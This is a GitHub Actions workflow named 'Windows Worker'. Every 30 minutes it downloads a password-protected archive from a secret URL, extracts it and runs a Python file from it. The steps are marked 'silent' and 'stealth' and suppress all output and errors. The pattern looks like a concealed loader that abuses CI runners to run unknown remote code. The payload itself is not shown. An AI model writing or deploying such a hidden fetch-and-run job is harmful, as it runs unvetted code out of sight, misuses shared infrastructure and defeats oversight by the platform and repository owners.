name: Windows Worker

on:
  workflow_dispatch:
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: worker
  cancel-in-progress: true

jobs:
  worker:
    runs-on: windows-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v3

      - name: Check worker switch
        shell: powershell
        env:
          WORKER_ENABLED: ${{ vars.WORKER_ENABLED }}
        run: |
          if ($Env:WORKER_ENABLED -ne "true") { exit 0 }

      - name: Prepare dependencies (silent)
        shell: powershell
        run: |
          choco install 7zip -y --no-progress > $null

      - name: Download package (silent)
        shell: powershell
        env:
          SRC_URL: ${{ secrets.LINK }}
        run: |
          $ProgressPreference = 'SilentlyContinue'
          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null

      - name: Extract package (silent)
        shell: powershell
        env:
          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
        run: |
          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null

      - name: Run worker (stealth)
        shell: powershell
        run: |
          $ErrorActionPreference = 'SilentlyContinue'
          $env:NODE_NO_WARNINGS = "1"

          $file = Get-ChildItem extracted -Recurse -Filter *.py | Select-Object -First 1
          if (-not $file) { exit 0 }

          cmd /c "python `"$($file.FullName)`" > nul 2>&1"
